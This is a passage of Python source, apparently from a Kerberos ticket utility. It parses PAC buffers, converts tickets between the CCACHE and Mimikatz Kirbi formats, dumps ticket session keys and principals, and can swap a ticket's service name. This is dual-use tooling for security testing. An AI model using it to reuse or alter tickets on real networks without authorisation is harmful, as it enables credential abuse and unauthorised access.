			print("\t[+] S4UTransitedServices = {}".format(delegationInfo['S4UTransitedServices']))
		elif infoBuffer['ulType'] == PAC_ATTRIBUTES_INFO:
			print("[+] PAC_ATTRIBUTES_INFO")
			attributeInfo = PAC_ATTRIBUTE_INFO(data)
			flags = attributeInfo['Flags']
			attrFlags = []
			for entry in Attributes_Flags:
				if flags & entry.value:
					attrFlags.append(entry.name)
			print(f"\t[+] Flags = ({flags}) {', '.join (attrFlags)}")
		elif infoBuffer['ulType'] == PAC_REQUESTOR_INFO:
			print("[+] PAC_REQUESTOR_INFO")
			requestorInfo = PAC_REQUESTOR(data)
			print("\t[+] User SID = {}".format (requestorInfo['UserSid'].formatCanonical()))

		buff = buff[16:]

####################
### CCACHE/Kirbi ###
####################

class Header(Structure):
	structure = (
		('tag', '!H=0'),
		('taglen', '!H=0'),
		('_tagdata', '_-tagdata', 'self["taglen"]'),
		('tagdata', ':')
	)

class DeltaTime(Structure):
	structure = (
		('time_offset', '!L=0'),
		('usec_offset', '!L=0')
	)

class CountedOctetString(Structure):
	structure = (
		('length', '!L=0'),
		('_data', '_-data', 'self["length"]'),
		('data', ':')
	)
	
	def prettyPrint(self, indent = ''):
		return "%s%s" % (indent, binascii.hexlify(self['data']))

class KeyBlockV3(Structure):
	structure = (
		('keytype', '!H=0'),
		('etype', '!H=0'),
		('etype2', '!H=0'),  # Version 3 repeats the etype
		('keylen', '!H=0'),
		('_keyvalue', '_-keyvalue', 'self["keylen"]'),
		('keyvalue', ':')
	)
	
	def prettyPrint(self):
		return "Key: (0x%x)%s" % (self['keytype'], binascii.hexlify(self['keyvalue']))

class KeyBlockV4(Structure):
	structure = (
		('keytype', '!H=0'),
		('etype', '!H=0'),
		('keylen', '!H=0'),
		('_keyvalue', '_-keyvalue', 'self["keylen"]'),
		('keyvalue', ':')
	)
	
	def prettyPrint(self):
		return "Key: (0x%x)%s" % (self['keytype'], binascii.hexlify(self['keyvalue']))

class Times(Structure):
	structure = (
		('authtime', '!L=0'),
		('starttime', '!L=0'),
		('endtime', '!L=0'),
		('renew_till', '!L=0')
	)
	
	def prettyPrint(self, indent = ''):
		print(("%sAuth : %s" % (indent, datetime.datetime.fromtimestamp(self['authtime']).isoformat())))
		print(("%sStart: %s" % (indent, datetime.datetime.fromtimestamp(self['starttime']).isoformat())))
		print(("%sEnd  : %s" % (indent, datetime.datetime.fromtimestamp(self['endtime']).isoformat())))
		print(("%sRenew: %s" % (indent, datetime.datetime.fromtimestamp(self['renew_till']).isoformat())))

class Address(Structure):
	structure = (
		('addrtype', '!H=0'),
		('addrdata', ':', CountedOctetString)
	)

class AuthData(Structure):
	structure = (
		('authtype', '!H=0'),
		('authdata', ':', CountedOctetString)
	)

class TicketFlagsEnum(Enum):
	reserved                 = 0
	forwardable              = 1
	forwarded                = 2
	proxiable                = 3
	proxy                    = 4
	may_postdate             = 5
	postdated                = 6
	invalid                  = 7
	renewable                = 8
	initial                  = 9
	pre_authent              = 10
	hw_authent               = 11
	transited_policy_checked = 12
	ok_as_delegate           = 13
	enc_pa_rep               = 15
	anonymous                = 16

class PrincipalNameType(Enum):
	NT_UNKNOWN              = 0
	NT_PRINCIPAL            = 1
	NT_SRV_INST             = 2
	NT_SRV_HST              = 3
	NT_SRV_XHST             = 4
	NT_UID                  = 5
	NT_X500_PRINCIPAL       = 6
	NT_SMTP_NAME            = 7
	NT_ENTERPRISE           = 10
	NT_WELLKNOWN            = 11
	NT_SRV_HST_DOMAIN       = 12
	NT_MS_PRINCIPAL         = -128
	NT_MS_PRINCIPAL_AND_ID  = -129
	NT_ENT_PRINCIPAL_AND_ID = -130

class PrincipalObj(object):
	"""
	The principal's value can be supplied as:
		* a single string
		* a sequence containing a sequence of component strings and a realm string
		* a sequence whose first n-1 elemeents are component strings and whose last
		component is the realm

	If the value contains no realm, then default_realm will be used.
	"""
	
	def __init__(self, value = None, default_realm = None, type = None):
		self.type = PrincipalNameType.NT_UNKNOWN
		self.components = []
		self.realm = None

		if value is None:
			return

		if isinstance(value, bytes):
			value = value.decode('utf-8')

		if isinstance(value, PrincipalObj):
			self.type = value.type
			self.components = value.components[:]
			self.realm = value.realm
		elif isinstance(value, str):
			m = re.match(r'((?:[^\\]|\\.)+?)(@((?:[^\\@]|\\.)+))?$', value)
			if not m:
				raise Exception("[-] Invalid principal syntax")

			def unquote_component(comp):
				return re.sub(r'\\(.)', r'\1', comp)

			if m.group(2) is not None:
				self.realm = unquote_component(m.group(3))
			else:
				self.realm = default_realm

			self.components = [unquote_component(qc) for qc in re.findall(r'(?:[^\\/]|\\.)+', m.group(1))]
		elif len(value) == 2:
			self.components = value[0]
			self.realm = value[-1]
			if isinstance(self.components, str):
				self.components = [self.components]
		elif len(value) >= 2:
			self.components = value[0:-1]
			self.realm = value[-1]
		else:
			raise Exception("[-] Invalid principal value")

		if type is not None:
			self.type = type

	def __eq__(self, other):
		if isinstance (other, str):
			other = Principal (other)

		return (self.type == PrincipalNameType.NT_UNKNOWN.value or
				other.type == PrincipalNameType.NT_UNKNOWN.value or
				self.type == other.type) and all (map (lambda a, b: a == b, self.components, other.components)) and \
				self.realm == other.realm

	def __str__(self):
		def quote_component(comp):
			return re.sub(r'([\\/@])', r'\\\1', comp)

		ret = "/".join([quote_component(c) for c in self.components])
		if self.realm is not None:
			ret += "@" + self.realm

		return ret

	def __repr__(self):
		return "Principal((" + repr(self.components) + ", " + repr(self.realm) + "), t=" + str(self.type) + ")"

	def from_asn1(self, data, realm_component, name_component):
		name = data.getComponentByName(name_component)
		self.type = PrincipalNameType(name.getComponentByName('name-type')).value
		self.components = [str(c) for c in name.getComponentByName('name-string')]
		self.realm = str(data.getComponentByName(realm_component))
		return self

	def components_to_asn1(self, name):
		name.setComponentByName('name-type', int(self.type))
		strings = name.setComponentByName('name-string').getComponentByName('name-string')
		for i, c in enumerate(self.components):
			strings.setComponentByPosition(i, c)

		return name

class Principal:
	class PrincipalHeader(Structure):
		structure = (
			('name_type', '!L=0'),
			('num_components', '!L=0')
		)

	def __init__(self, data = None):
		self.components = []
		self.realm = None
		if data is not None:
			self.header = self.PrincipalHeader(data)
			data = data[len(self.header):]
			self.realm = CountedOctetString(data)
			data = data[len(self.realm):]
			self.components = []
			for component in range(self.header['num_components']):
				comp = CountedOctetString(data)
				data = data[len(comp):]
				self.components.append(comp)
		else:
			self.header = self.PrincipalHeader()

	def __len__(self):
		totalLen = len(self.header) + len(self.realm)
		for i in self.components:
			totalLen += len(i)
		return totalLen

	def getData(self):
		data = self.header.getData() + self.realm.getData()
		for component in self.components:
			data += component.getData()
		return data

	def __str__(self):
		return self.getData()

	def prettyPrint(self):
		principal = b''
		for component in self.components:
			if isinstance(component['data'], bytes) is not True:
				component = bytes(component['data'], "UTF-8")
			else:
				component = component['data']
			principal += component + b'/'

		principal = principal[:-1]
		if isinstance(self.realm['data'], bytes):
			realm = self.realm['data']
		else:
			realm = bytes(self.realm['data'], "UTF-8")
		principal += b'@' + realm
		return principal

	def fromPrincipal(self, principal):
		self.header['name_type'] = principal.type
		self.header['num_components'] = len(principal.components)
		octetString = CountedOctetString()
		octetString['length'] = len(principal.realm)
		octetString['data'] = principal.realm
		self.realm = octetString
		self.components = []
		for c in principal.components:
			octetString = CountedOctetString()
			octetString['length'] = len(c)
			octetString['data'] = c
			self.components.append(octetString)

	def toPrincipal(self):
		return PrincipalObj(self.prettyPrint(), type = self.header['name_type'])

class Key(object):
	def __init__(self, encType, contents):
		cipher = ENCTYPE_TABLE[encType]
		if len(contents) != cipher.keySize:
			raise Exception('[-] Wrong key length')
		self.encType = encType
		self.contents = contents

class EncryptedDataObj(object):
	def __init__(self):
		self.etype = None
		self.kvno = None
		self.ciphertext = None

	def from_asn1(self, data):
		data = _asn1_decode(data, EncryptedData())
		self.etype = EncryptionTypes(data.getComponentByName('etype')).value
		kvno = data.getComponentByName('kvno')
		if (kvno is None) or (kvno.hasValue() is False):
			self.kvno = False
		else:
			self.kvno = kvno
		self.ciphertext = str(data.getComponentByName('cipher'))
		return self

	def to_asn1(self, component):
		component.setComponentByName('etype', int(self.etype))
		if self.kvno:
			component.setComponentByName('kvno', self.kvno)
		component.setComponentByName('cipher', self.ciphertext)
		return component

class TicketObj(object):
	def __init__(self):
		# This is the kerberos version, not the service principal key version number.
		self.tkt_vno = None
		self.service_principal = None
		self.encrypted_part = None

	def from_asn1(self, data):
		data = _asn1_decode(data, Ticket())
		self.tkt_vno = int(data.getComponentByName('tkt-vno'))
		self.service_principal = PrincipalObj()
		self.service_principal.from_asn1(data, 'realm', 'sname')
		self.encrypted_part = EncryptedDataObj()
		self.encrypted_part.from_asn1(data.getComponentByName('enc-part'))
		return self

	def to_asn1(self, component):
		component.setComponentByName('tkt-vno', 5)
		component.setComponentByName('realm', self.service_principal.realm)
		seq_set(component, 'sname', self.service_principal.components_to_asn1)
		seq_set(component, 'enc-part', self.encrypted_part.to_asn1)
		return component

	def __str__(self):
		return "<Ticket for %s vno %s>" % (str(self.service_principal), str(self.encrypted_part.kvno)) 

class Credential:
	class CredentialHeaderV3(Structure):
		structure = (
			('client', ':', Principal),
			('server', ':', Principal),
			('key', ':', KeyBlockV3),
			('time', ':', Times),
			('is_skey', 'B=0'),
			('tktflags', '!L=0'),
			('num_address', '!L=0')
		)

	class CredentialHeaderV4(Structure):
		structure = (
			('client', ':', Principal),
			('server', ':', Principal),
			('key', ':', KeyBlockV4),
			('time', ':', Times),
			('is_skey', 'B=0'),
			('tktflags', '!L=0'),
			('num_address', '!L=0')
		)

	def __init__(self, data = None, ccache_version = None):
		self.addresses = ()
		self.authData = ()
		self.header = None
		self.ticket = None
		self.secondTicket = None

		if data is not None:
			if ccache_version == 3:
				self.header = self.CredentialHeaderV3(data)
			else:
				self.header = self.CredentialHeaderV4(data)

			data = data[len(self.header):]
			self.addresses = []
			for address in range(self.header['num_address']):
				ad = Address(data)
				data = data[len(ad):]
				self.addresses.append(ad)
			num_authdata = unpack('!L', data[:4])[0]
			data = data[calcsize('!L'):]
			for authdata in range(num_authdata):
				ad = AuthData(data)
				data = data[len(ad):]
				self.authData.append(ad)
			self.ticket = CountedOctetString(data)
			data = data[len(self.ticket):]
			self.secondTicket = CountedOctetString(data)
			data = data[len(self.secondTicket):]
		else:
			self.header = self.CredentialHeaderV4()

	def __getitem__(self, key):
		return self.header[key]

	def __setitem__(self, item, value):
		self.header[item] = value

	def getServerPrincipal(self):
		return self.header['server'].prettyPrint()

	def __len__(self):
		totalLen = len(self.header)
		for i in self.addresses:
			totalLen += len(i)
		totalLen += calcsize('!L')
		for i in self.authData:
			totalLen += len(i)
		totalLen += len(self.ticket)
		totalLen += len(self.secondTicket)
		return totalLen

	def dump(self):
		self.header.dump()

	def getData(self):
		data = self.header.getData()
		for i in self.addresses:
			data += i.getData()
		data += pack('!L', len(self.authData))
		for i in self.authData:
			data += i.getData()
		data += self.ticket.getData()
		data += self.secondTicket.getData()
		return data

	def __str__(self):
		return self.getData()

	def prettyPrint(self, indent = ''):
		print(("%sClient: %s" % (indent, self.header['client'].prettyPrint())))
		print(("%sServer: %s" % (indent, self.header['server'].prettyPrint())))
		print(("%s%s" % (indent, self.header['key'].prettyPrint())))
		print(("%sTimes: " % indent))
		self.header['time'].prettyPrint('\t\t')
		print(("%sSubKey: %s" % (indent, self.header['is_skey'])))
		print(("%sFlags: 0x%x" % (indent, self.header['tktflags'])))
		print(("%sAddresses: %d" % (indent, self.header['num_address'])))
		for address in self.addresses:
			address.prettyPrint('\t\t')
		print(("%sAuth Data: %d" % (indent, len(self.authData))))
		for ad in self.authData:
			ad.prettyPrint('\t\t')
		print(("%sTicket: %s" % (indent, self.ticket.prettyPrint())))
		print(("%sSecond Ticket: %s" % (indent, self.secondTicket.prettyPrint())))

	def toASREP(self):
		tgt_rep = AS_REP()
		tgt_rep['pvno'] = 5
		tgt_rep['msg-type'] = int(ApplicationTagNumbers.AS_REP.value)
		tgt_rep['crealm'] = self['server'].realm['data']

		# Fake EncryptedData
		tgt_rep['enc-part'] = univ.noValue
		tgt_rep['enc-part']['etype'] = 1
		tgt_rep['enc-part']['cipher'] = ''
		seq_set(tgt_rep, 'cname', self['client'].toPrincipal().components_to_asn1)
		ticket = TicketObj()
		ticket.from_asn1(self.ticket['data'])
		seq_set(tgt_rep, 'ticket', ticket.to_asn1)

		cipher = ENCTYPE_TABLE[self['key']['keytype']]()

		tgt = dict()
		tgt['KDC_REP'] = encoder.encode(tgt_rep)
		tgt['cipher'] = cipher
		tgt['sessionKey'] = Key(cipher.encType, self['key']['keyvalue'])
		return tgt

	def toTGSREP(self, newSPN = None):
		tgs_rep = TGS_REP()
		tgs_rep['pvno'] = 5
		tgs_rep['msg-type'] = int(ApplicationTagNumbers.TGS_REP.value)
		tgs_rep['crealm'] = self['server'].realm['data']

		# Fake EncryptedData
		tgs_rep['enc-part'] = univ.noValue
		tgs_rep['enc-part']['etype'] = 1
		tgs_rep['enc-part']['cipher'] = ''
		seq_set(tgs_rep, 'cname', self['client'].toPrincipal().components_to_asn1)
		ticket = TicketObj()
		ticket.from_asn1(self.ticket['data'])
		if newSPN is not None:
			if newSPN.upper() != str(ticket.service_principal).upper():
				print('[+] Changing sname from %s to %s and hoping for the best' % (ticket.service_principal, newSPN))
				ticket.service_principal = PrincipalObj(newSPN, type = int(ticket.service_principal.type))
		seq_set(tgs_rep,'ticket', ticket.to_asn1)

		cipher = ENCTYPE_TABLE[self['key']['keytype']]()

		tgs = dict()
		tgs['KDC_REP'] = encoder.encode(tgs_rep)
		tgs['cipher'] = cipher
		tgs['sessionKey'] = Key(cipher.encType, self['key']['keyvalue'])
		return tgs

class KrbCredInfo(univ.Sequence):
	componentType = namedtype.NamedTypes(
		_sequence_component('key', 0, EncryptionKey()),
		_sequence_optional_component('prealm', 1, Realm()),
		_sequence_optional_component('pname', 2, PrincipalName()),
		_sequence_optional_component('flags', 3, TicketFlags()),
		_sequence_optional_component('authtime', 4, KerberosTime()),
		_sequence_optional_component('starttime', 5, KerberosTime()),
		_sequence_optional_component('endtime', 6, KerberosTime()),
		_sequence_optional_component('renew-till', 7, KerberosTime()),
		_sequence_optional_component('srealm', 8, Realm()),
		_sequence_optional_component('sname', 9, PrincipalName()),
		_sequence_optional_component('caddr', 10, HostAddresses()),
		)

class EncKrbCredPart(univ.Sequence):
	tagSet = _application_tag(ApplicationTagNumbers.EncKrbCredPart.value)
	componentType = namedtype.NamedTypes(
		_sequence_component('ticket-info', 0, univ.SequenceOf(componentType = KrbCredInfo())),
		_sequence_optional_component('nonce', 1, UInt32()),
		_sequence_optional_component('timestamp', 2, KerberosTime()),
		_sequence_optional_component('usec', 3, Microseconds()),
		_sequence_optional_component('s-address', 4, HostAddress()),
		_sequence_optional_component('r-address', 5, HostAddress()),
		)

class KRB_CRED(univ.Sequence):
	tagSet = _application_tag(ApplicationTagNumbers.KRB_CRED.value)
	componentType = namedtype.NamedTypes(
		_vno_component(0),
		_msg_type_component(1, (ApplicationTagNumbers.KRB_CRED.value,)),
		_sequence_optional_component('tickets', 2, univ.SequenceOf(componentType = Ticket())),
		_sequence_component('enc-part', 3, EncryptedData()),
		)

class CCache:
	# https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html

	class MiniHeader(Structure):
		structure = (
			('file_format_version', '!H=0x0504'),
			('headerlen', '!H=12'),
		)

	def __init__(self, data = None):
		self.headers = None
		self.principal = None
		self.credentials = []
		self.miniHeader = None

		if data is not None:
			ccache_version = data[1]

			# Versions 1 and 2 are not implemented yet
			if ccache_version == 1 or ccache_version == 2:
				raise Exception('[-] CCache version not implemented')

			# Only Version 4 contains a header
			if ccache_version == 4:
				miniHeader = self.MiniHeader(data)
				data = data[len(miniHeader.getData()):]

				headerLen = miniHeader['headerlen']

				self.headers = []
				while headerLen > 0:
					header = Header(data)
					self.headers.append(header)
					headerLen -= len(header)
					data = data[len(header):]
			else:
				# Skip over the version bytes
				data = data[2:]

			# Now the primary_principal
			self.principal = Principal(data)

			data = data[len(self.principal):]

			# Now let's parse the credentials
			self.credentials = []
			while len(data) > 0:
				cred = Credential(data, ccache_version)
				if cred['server'].prettyPrint().find(b'krb5_ccache_conf_data') < 0:
					self.credentials.append(cred)
				data = data[len(cred.getData()):]
	
	def getData(self):
		data = self.MiniHeader().getData()
		for header in self.headers:
			data += header.getData()
		data += self.principal.getData()
		for credential in self.credentials:
			data += credential.getData()
		return data

	def toTimeStamp(self, dt, epoch = datetime.datetime(1970,1,1)):
		td = dt - epoch
		# return td.total_seconds()
		return int((td.microseconds + (td.seconds + td.days * 24 * 3600) * 10**6) // 1e6)

	def reverseFlags(self, flags):
		result = 0
		if isinstance(flags, str):
			flags = flags[1:-2]
		for i,j in enumerate(reversed(flags)):
			if j != 0:
				result += j << i
		return result

	def fromASREP(self, asRep, userSecretKey):
		self.headers = []
		header = Header()
		header['tag'] = 1
		header['taglen'] = 8
		header['tagdata'] = b'\xff\xff\xff\xff\x00\x00\x00\x00'
		self.headers.append(header)

		decodedASREP = decoder.decode(asRep, asn1Spec = AS_REP())[0]

		tmpPrincipal = PrincipalObj()
		tmpPrincipal.from_asn1(decodedASREP, 'crealm', 'cname')
		self.principal = Principal()
		self.principal.fromPrincipal(tmpPrincipal)

		# Now let's add the credential
		cipherText = decodedASREP['enc-part']['cipher']

		cipher = ENCTYPE_TABLE[decodedASREP['enc-part']['etype']]
		KEYUSAGE = 3
		plainText, confounder = cipher.decrypt(userSecretKey, KEYUSAGE, cipherText)

		encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
		credential = Credential()
		server = PrincipalObj()
		server.from_asn1(encASRepPart, 'srealm', 'sname')
		tmpServer = Principal()
		tmpServer.fromPrincipal(server)

		credential['client'] = self.principal
		credential['server'] = tmpServer
		credential['is_skey'] = 0

		credential['key'] = KeyBlockV4()
		credential['key']['keytype'] = int(encASRepPart['key']['keytype'])
		credential['key']['keyvalue'] = encASRepPart['key']['keyvalue'].asOctets()
		credential['key']['keylen'] = len(credential['key']['keyvalue'])

		credential['time'] = Times()
		credential['time']['authtime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encASRepPart['authtime']))
		credential['time']['starttime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encASRepPart['starttime']))
		credential['time']['endtime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encASRepPart['endtime']))
		credential['time']['renew_till'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encASRepPart['renew-till']))

		flags = self.reverseFlags(encASRepPart['flags'])
		credential['tktflags'] = flags

		credential['num_address'] = 0
		credential.ticket = CountedOctetString()
		credential.ticket['data'] = encoder.encode(decodedASREP['ticket'].clone(tagSet = Ticket.tagSet, cloneValueFlag = True))
		credential.ticket['length'] = len(credential.ticket['data'])
		credential.secondTicket = CountedOctetString()
		credential.secondTicket['data'] = b''
		credential.secondTicket['length'] = 0
		self.credentials.append(credential)

	def fromTGSREP(self, tgsRep, clientTGSSessionKey):
		self.headers = []
		header = Header()
		header['tag'] = 1
		header['taglen'] = 8
		header['tagdata'] = b'\xff\xff\xff\xff\x00\x00\x00\x00'
		self.headers.append(header)

		decodedTGSREP = decoder.decode(tgsRep, asn1Spec = TGS_REP())[0]

		tmpPrincipal = PrincipalObj()
		tmpPrincipal.from_asn1(decodedTGSREP, 'crealm', 'cname')
		self.principal = Principal()
		self.principal.fromPrincipal(tmpPrincipal)

		# Now let's add the credential
		cipherText = decodedTGSREP['enc-part']['cipher']

		cipher = ENCTYPE_TABLE[decodedTGSREP['enc-part']['etype']]
		KEYUSAGE = 8
		plainText, confounder = cipher.decrypt(clientTGSSessionKey, KEYUSAGE, cipherText)

		encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]

		credential = Credential()
		server = PrincipalObj()
		server.from_asn1(encTGSRepPart, 'srealm', 'sname')
		tmpServer = Principal()
		tmpServer.fromPrincipal(server)

		credential['client'] = self.principal
		credential['server'] = tmpServer
		credential['is_skey'] = 0

		credential['key'] = KeyBlockV4()
		credential['key']['keytype'] = int(encTGSRepPart['key']['keytype'])
		credential['key']['keyvalue'] = encTGSRepPart['key']['keyvalue'].asOctets()
		credential['key']['keylen'] = len(credential['key']['keyvalue'])

		credential['time'] = Times()
		credential['time']['authtime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encTGSRepPart['authtime']))
		credential['time']['starttime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encTGSRepPart['starttime']))
		credential['time']['endtime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encTGSRepPart['endtime']))
		# After KB4586793 for CVE-2020-17049 this timestamp may be omitted
		if encTGSRepPart['renew-till'].hasValue():
			credential['time']['renew_till'] = self.toTimeStamp(KerberosTimeObj.from_asn1(encTGSRepPart['renew-till']))

		flags = self.reverseFlags(encTGSRepPart['flags'])
		credential['tktflags'] = flags

		credential['num_address'] = 0

		credential.ticket = CountedOctetString()
		credential.ticket['data'] = encoder.encode(decodedTGSREP['ticket'].clone(tagSet = Ticket.tagSet, cloneValueFlag = True))
		credential.ticket['length'] = len(credential.ticket['data'])
		credential.secondTicket = CountedOctetString()
		credential.secondTicket['data'] = b''
		credential.secondTicket['length'] = 0
		self.credentials.append(credential)
	
	@classmethod
	def loadFile(cls, fileName):
		try:
			f = open(fileName, 'rb')
			data = f.read()
			f.close()
			return cls(data)
		except FileNotFoundError as e:
			raise e

	def saveFile(self, fileName):
		f = open(fileName, 'wb+')
		f.write(self.getData())
		f.close()

	def prettyPrint(self):
		print(("[+] Primary Principal: %s" % self.principal.prettyPrint()))
		print("[+] Credentials: ")
		for i, credential in enumerate(self.credentials):
			print(("[%d]" % i))
			credential.prettyPrint('\t')
			
	@classmethod
	def loadKirbiFile(cls, fileName):
		f = open(fileName, 'rb')
		data = f.read()
		f.close()
		ccache = cls()
		ccache.fromKRBCRED(data)
		return ccache

	def saveKirbiFile(self, fileName):
		f = open(fileName, 'wb+')
		f.write(self.toKRBCRED())
		f.close()
	
	def setDefaultHeader(self):
		self.headers = []
		header = Header()
		header['tag'] = 1
		header['taglen'] = 8
		header['tagdata'] = b'\xff\xff\xff\xff\x00\x00\x00\x00'
		self.headers.append(header)

	def fromKRBCRED(self, encodedKrbCred):
		krbCred = decoder.decode(encodedKrbCred, asn1Spec = KRB_CRED())[0]
		encKrbCredPart = decoder.decode(krbCred['enc-part']['cipher'], asn1Spec = EncKrbCredPart())[0]
		krbCredInfo = encKrbCredPart['ticket-info'][0]

		self.setDefaultHeader()

		tmpPrincipal = PrincipalObj()
		tmpPrincipal.from_asn1(krbCredInfo, 'prealm', 'pname')
		self.principal = Principal()
		self.principal.fromPrincipal(tmpPrincipal)

		credential = Credential()
		server = PrincipalObj()
		server.from_asn1(krbCredInfo, 'srealm', 'sname')
		tmpServer = Principal()
		tmpServer.fromPrincipal(server)

		credential['client'] = self.principal
		credential['server'] = tmpServer
		credential['is_skey'] = 0

		credential['key'] = KeyBlockV4()
		credential['key']['keytype'] = int(krbCredInfo['key']['keytype'])
		credential['key']['keyvalue'] = krbCredInfo['key']['keyvalue'].asOctets()
		credential['key']['keylen'] = len(credential['key']['keyvalue'])

		credential['time'] = Times()

		credential['time']['authtime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(krbCredInfo['starttime']))
		credential['time']['starttime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(krbCredInfo['starttime']))
		credential['time']['endtime'] = self.toTimeStamp(KerberosTimeObj.from_asn1(krbCredInfo['endtime']))
		credential['time']['renew_till'] = self.toTimeStamp(KerberosTimeObj.from_asn1(krbCredInfo['renew-till']))

		flags = self.reverseFlags(krbCredInfo['flags'])
		credential['tktflags'] = flags

		credential['num_address'] = 0
		credential.ticket = CountedOctetString()
		credential.ticket['data'] = encoder.encode(krbCred['tickets'][0].clone(tagSet = Ticket.tagSet, cloneValueFlag = True))
		credential.ticket['length'] = len(credential.ticket['data'])
		credential.secondTicket = CountedOctetString()
		credential.secondTicket['data'] = b''
		credential.secondTicket['length'] = 0

		self.credentials.append(credential)

	def toKRBCRED(self):
		principal = self.principal
		credential = self.credentials[0]

		krbCredInfo = KrbCredInfo()

		krbCredInfo['key'] = univ.noValue
		krbCredInfo['key']['keytype'] = credential['key']['keytype']
		krbCredInfo['key']['keyvalue'] = credential['key']['keyvalue']

		krbCredInfo['prealm'] = principal.realm.fields['data']

		krbCredInfo['pname'] = univ.noValue
		krbCredInfo['pname']['name-type'] = principal.header['name_type']
		seq_set_iter(krbCredInfo['pname'], 'name-string', (principal.components[0].fields['data'],))

		krbCredInfo['flags'] = credential['tktflags']

		krbCredInfo['starttime'] = KerberosTimeObj.to_asn1(datetime.datetime.utcfromtimestamp(credential['time']['starttime']))
		krbCredInfo['endtime'] = KerberosTimeObj.to_asn1(datetime.datetime.utcfromtimestamp(credential['time']['endtime']))
		krbCredInfo['renew-till'] = KerberosTimeObj.to_asn1(datetime.datetime.utcfromtimestamp(credential['time']['renew_till']))

		krbCredInfo['srealm'] = credential['server'].realm.fields['data']

		krbCredInfo['sname'] = univ.noValue
		krbCredInfo['sname']['name-type'] = credential['server'].header['name_type']
		tmpServiceClass = credential['server'].components[0].fields['data']
		tmpServiceHostname = credential['server'].components[1].fields['data']
		seq_set_iter(krbCredInfo['sname'], 'name-string', (tmpServiceClass, tmpServiceHostname))

		encKrbCredPart = EncKrbCredPart()
		seq_set_iter(encKrbCredPart, 'ticket-info', (krbCredInfo,))

		krbCred = KRB_CRED()
		krbCred['pvno'] = 5
		krbCred['msg-type'] = 22

		krbCred['enc-part'] = univ.noValue
		krbCred['enc-part']['etype'] = 0
		krbCred['enc-part']['cipher'] = encoder.encode(encKrbCredPart)

		ticket = decoder.decode(credential.ticket['data'], asn1Spec = Ticket())[0]
		seq_set_iter(krbCred, 'tickets', (ticket,))

		encodedKrbCred = encoder.encode(krbCred)

		return encodedKrbCred

def isKirbiFile(filename):
	with open(filename, 'rb') as fi:
		fileid = unpack(">B", fi.read(1))[0]
	return fileid == 0x76

def isCCacheFile(filename):
	with open(filename, 'rb') as fi:
		fileid = unpack(">B", fi.read(1))[0]
	return fileid == 0x5
	
def convertCredFile(inf, outf):
	print_yellow("[*] Converting credential file")
	print_yellow("---")
	print()

	try:
		if isKirbiFile(inf):
			print(f"[+] Converting Kirbi file '{inf}' to CCACHE file '{outf}'")
			ccache = CCache.loadKirbiFile(inf)
			ccache.saveFile(outf)
			print("[+] Done")
		elif isCCacheFile(inf):
			print(f"[+] Converting CCACHE file '{inf}' to Kirbi file '{outf}'")
			ccache = CCache.loadFile(inf)
			ccache.saveKirbiFile(outf)
			print("[+] Done")
		else:
			print(f"[-] Unknown file format '{inf}'", file = sys.stderr)
			return
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def parseCredFile(credFile, hexKeys, hexASRepEncKeys):
	print_yellow("[*] Parsing credential file")
	print_yellow("---")
	print()

	try:
		if hexKeys != None:
			hexKeys = hexKeys.split(',')
		if hexASRepEncKeys != None:
			hexASRepEncKeys = hexASRepEncKeys.split(',')

		if isKirbiFile(credFile):
			ccache = CCache.loadKirbiFile(credFile)
		elif isCCacheFile(credFile):
			ccache = CCache.loadFile(credFile)
		else:
			print("[-] Unknown file format", file = sys.stderr)
			return

		# Printing principal
		print("[+] Principal = {}".format(ccache.principal.prettyPrint().decode()))

		cred_number = 0
		for creds in ccache.credentials:
			print('\n--------------- Unencrypted credential[%d] ---------------' % cred_number)

			# Same structure as ASREP. Thus using one of both is the same
			rawTicket = creds.toTGSREP()
			decodedTicket = decoder.decode(rawTicket['KDC_REP'], asn1Spec = TGS_REP())[0]

			# Parsing the credential
			print("[+] Ticket session key = {}".format(binascii.hexlify(rawTicket['sessionKey'].contents).decode('utf-8')))
			print("[+] User name = {}".format(creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')))
			print("[+] User realm = {}".format(creds['client'].prettyPrint().split(b'@')[1].decode('utf-8')))
			print("[+] Service name = {}".format(creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')))
			print("[+] Service realm = {}".format(creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')))
			print("[+] UTC Start time = {}".format(datetime.datetime.fromtimestamp(creds['time']['starttime'], tz = datetime.timezone.utc).strftime("%d/%m/%Y %H:%M:%S %p")))
			if datetime.datetime.fromtimestamp(creds['time']['endtime'], tz = datetime.timezone.utc) < datetime.datetime.now(tz = datetime.timezone.utc):
				print("[+] UTC End time = {} (expired)".format(datetime.datetime.fromtimestamp(creds['time']['endtime'], tz = datetime.timezone.utc).strftime("%d/%m/%Y %H:%M:%S %p")))
			else:
				print("[+] UTC End time = {}".format(datetime.datetime.fromtimestamp(creds['time']['endtime'], tz = datetime.timezone.utc).strftime("%d/%m/%Y %H:%M:%S %p")))
			if datetime.datetime.fromtimestamp(creds['time']['renew_till'], tz = datetime.timezone.utc) < datetime.datetime.now(tz = datetime.timezone.utc):
				print("[+] UTC End renew time = {} (expired)".format(datetime.datetime.fromtimestamp(creds['time']['renew_till'], tz = datetime.timezone.utc).strftime("%d/%m/%Y %H:%M:%S %p")))
			else:
				print("[+] UTC End renew time = {}".format(datetime.datetime.fromtimestamp(creds['time']['renew_till'], tz = datetime.timezone.utc).strftime("%d/%m/%Y %H:%M:%S %p")))
			flags = []
			for k in TicketFlagsEnum:
				if ((creds['tktflags'] >> (31 - k.value)) & 1) == 1:
					flags.append(TicketFlagsEnum(k.value).name)
			print("[+] Flags = ({}) {}".format(hex(creds['tktflags']), ", ".join(flags)))
